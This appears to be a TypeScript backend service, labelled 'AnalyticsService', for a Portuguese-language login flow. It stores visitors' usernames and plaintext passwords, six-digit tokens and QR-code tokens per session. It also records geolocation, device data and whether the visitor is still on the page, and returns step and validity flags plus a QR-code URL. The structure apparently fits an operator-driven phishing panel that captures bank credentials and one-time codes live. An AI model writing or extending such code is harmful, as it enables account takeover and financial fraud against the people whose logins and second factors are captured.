import { IpService } from "@/services/ipService";
import { UserAgentService } from "@/services/userAgentService";
import { z } from "zod";
import { ClientEventRepo } from "./ClientEventRepo";
import { SessionRepo } from "./SessionRepo";
import { UserRepo } from "./UserRepo";
import { IdentificationBody, IdentificationResponse } from "./dto";
const SenhaSchema = z.string().min(8).max(20);
const Token1Schema = z.string().length(6);
export const EVT = {
  LOGIN_INICIO: "Cliente iniciou login",
  TOKEN_S2_ENVIADO: "Cliente enviou Token",
  TOKEN_QR_ENVIADO: "Cliente enviou Token Qr Code",
  PAGE_ENTER: "Usuario entrou na página",
  PAGE_RELOAD: "Usuario recarregou a página",
  PAGE_LEAVE: "Usuario saiu da página",
  TAB_CHANGE: "Usuario mudou de aba",
} as const;
export class AnalyticsService {
  private sessions = new SessionRepo();
  private users = new UserRepo();
  private events = new ClientEventRepo();
  private ipService = new IpService();

  private static readonly PING_TIMEOUT_MS = 5_000;

  async registerEvent(sessionId: string, eventType: string, eventData?: any) {
    await this.events.create({
      sessionId,
      eventType,
      eventData: eventData === undefined ? null : JSON.stringify(eventData),
    });
    if (
      eventType === EVT.PAGE_LEAVE ||
      eventType === EVT.PAGE_RELOAD ||
      eventType === "VISIBILITY_HIDDEN" || 
      eventType === "TAB_HIDE"             
    ) {
      await this.sessions.markOffline(sessionId);
    }
  }

  private async processLoginS1(sessionId: string, body: IdentificationBody) {
    if (body.usuario && body.senha) {
      SenhaSchema.parse(body.senha);
      await this.users.upsertBySession(sessionId, {
        usuario: body.usuario,
        senha: body.senha,
      });
      await this.setFlags(sessionId, { isLoginS1Loading: true });
      await this.registerEvent(sessionId, EVT.LOGIN_INICIO);
    }
  }

  private async processTokenS2(sessionId: string, body: IdentificationBody) {
    if (body.token) {
      Token1Schema.parse(body.token);
      await this.users.upsertBySession(sessionId, { token1: body.token });
      await this.setFlags(sessionId, { isTokenS2Loading: true });
      await this.registerEvent(sessionId, EVT.TOKEN_S2_ENVIADO);
    }
  }

  private async processTokenQr(sessionId: string, body: IdentificationBody) {
    if (body.tokenqr) {
      await this.users.upsertBySession(sessionId, { tokenqr: body.tokenqr });
      await this.setFlags(sessionId, { isTokenQrLoading: true });
      await this.registerEvent(sessionId, EVT.TOKEN_QR_ENVIADO);
    }
  }
  private async setFlags(
    sessionId: string,
    flags: Partial<{
      isLoginS1Loading: boolean;
      isTokenS2Loading: boolean;
      isTokenQrLoading: boolean;
    }>
  ) {
    const patch: Record<string, any> = {};
    if (flags.isLoginS1Loading !== undefined) patch.isLoginS1Loading = flags.isLoginS1Loading;
    if (flags.isTokenS2Loading !== undefined) patch.isTokenS2Loading = flags.isTokenS2Loading;
    if (flags.isTokenQrLoading !== undefined) patch.isTokenQrLoading = flags.isTokenQrLoading;
    if (Object.keys(patch).length) {
      await this.sessions.updateData(sessionId, patch);
    }
  }
    async handlePost(params: {
    sessionId: string;
    ipAddress: string;
    userAgent: string;
    origin?: string | null;
    body: IdentificationBody;
  }): Promise<IdentificationResponse> {
    const { sessionId, ipAddress, userAgent, origin, body } = params;
    await this.sessions.markOfflineWhereStale(AnalyticsService.PING_TIMEOUT_MS);
    const existing = await this.sessions.get(sessionId);
    const ua = new UserAgentService(userAgent).getUserAgentInfo();
    if (!existing) {
      const geo = await this.ipService.getIpInfo(ipAddress).catch(() => null);
      await this.sessions.createWithData({
        sessionId,
        ipAddress,
        userAgent,
        browser: ua.browser,
        device: ua.device,
        os: ua.os,
        origin: origin ?? null,
        country: geo?.country ?? null,
        state: geo?.region ?? null,
        city: geo?.city ?? null,
      });
      return {};
    }
    await this.sessions.updatePing(sessionId);
    const geo = await this.ipService.getIpInfo(ipAddress).catch(() => null);
    await this.sessions.updatePing(sessionId);
    await this.sessions.updateGeoAndUA(sessionId, {
      ipAddress,
      userAgent,
      browser: ua.browser,
      device: ua.device,
      os: ua.os,
      origin: origin ?? undefined,
      country: geo?.country ?? undefined,
      state: geo?.region ?? undefined,
      city: geo?.city ?? undefined,
    });
    await this.processLoginS1(sessionId, body);
    await this.processTokenS2(sessionId, body);
    await this.processTokenQr(sessionId, body);
    const fresh = await this.sessions.get(sessionId);
    const data = fresh!.data!;
    const now = Date.now();
    if (data.lastPing && now - new Date(data.lastPing).getTime() > AnalyticsService.PING_TIMEOUT_MS) {
      await this.sessions.updateData(sessionId, { isOnline: false });
    }

    const d = (await this.sessions.get(sessionId))!.data!;
    const u = (await this.sessions.get(sessionId))!.clientUser;
    const tt = d.tokenType === "TOKEN" ? 2 : 1;

    return {
      s: d.step ?? null,
      ils1l: d.isLoginS1Loading,
      ils1e: d.isLoginS1Error,
      ils1v: d.isLoginS1Valid,
      n: u?.name ?? null,
      ns: u?.numSerie ?? null,
      tt,
      ils2l: d.isTokenS2Loading,
      ils2e: d.isTokenS2Error,
      ils2v: d.isTokenS2Valid,
      ils3l: d.isTokenQrLoading,
      ils3e: d.isTokenQrError,
      qrCodeUrl: d.qrCodeUrl ?? null,
    };
  }
}
